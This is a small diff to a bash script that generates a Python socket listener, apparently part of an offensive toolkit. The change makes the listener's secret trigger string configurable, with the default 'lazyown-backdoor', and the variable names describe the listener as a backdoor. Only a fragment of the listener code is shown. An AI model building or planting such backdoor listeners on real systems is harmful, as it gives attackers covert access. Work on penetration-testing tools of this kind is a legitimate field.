@@ -1,5 +1,6 @@
 #!/bin/bash
 SOURCE_FILE="listener_{line}.py"
+CADENA="${BACKDOOR_PASSWORD:-lazyown-backdoor}"
 cat > $SOURCE_FILE <<EOL
 import socket
 import re
@@ -11,7 +12,7 @@ PORT = {lport}
 IP = "{lhost}"
 PUERTO = {listener}
 
-especial_cadena = "grisiscomebacksayknokknok"
+especial_cadena = "${CADENA}"
 
 
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
